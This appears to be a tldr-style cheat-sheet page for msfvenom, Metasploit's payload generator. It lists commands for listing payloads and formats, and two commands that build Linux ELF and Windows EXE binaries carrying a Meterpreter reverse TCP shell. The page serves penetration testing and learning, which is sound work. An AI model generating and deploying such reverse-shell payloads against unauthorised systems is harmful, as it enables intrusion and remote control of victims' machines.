---
layout: page
title: common/msfvenom (English)
description: "Manually generate payloads for metasploit."
content_hash: 097eb6ac8631e1b268a6f3ef2467207fd593c11b
---
# msfvenom

Manually generate payloads for metasploit.
More information: <https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom>.

- List payloads:

`msfvenom -l payloads`

- List formats:

`msfvenom -l formats`

- Show payload options:

`msfvenom -p `<span class="tldr-var badge badge-pill bg-dark-lm bg-white-dm text-white-lm text-dark-dm font-weight-bold">payload</span>` --list-options`

- Create an ELF binary with a reverse TCP handler:

`msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=`<span class="tldr-var badge badge-pill bg-dark-lm bg-white-dm text-white-lm text-dark-dm font-weight-bold">local_ip</span>` LPORT=`<span class="tldr-var badge badge-pill bg-dark-lm bg-white-dm text-white-lm text-dark-dm font-weight-bold">local_port</span>` -f elf > `<span class="tldr-var badge badge-pill bg-dark-lm bg-white-dm text-white-lm text-dark-dm font-weight-bold">path/to/binary</span>

- Create an EXE binary with a reverse TCP handler:

`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=`<span class="tldr-var badge badge-pill bg-dark-lm bg-white-dm text-white-lm text-dark-dm font-weight-bold">local_ip</span>` LPORT=`<span class="tldr-var badge badge-pill bg-dark-lm bg-white-dm text-white-lm text-dark-dm font-weight-bold">local_port</span>` -f exe > `<span class="tldr-var badge badge-pill bg-dark-lm bg-white-dm text-white-lm text-dark-dm font-weight-bold">path/to/binary.exe</span>
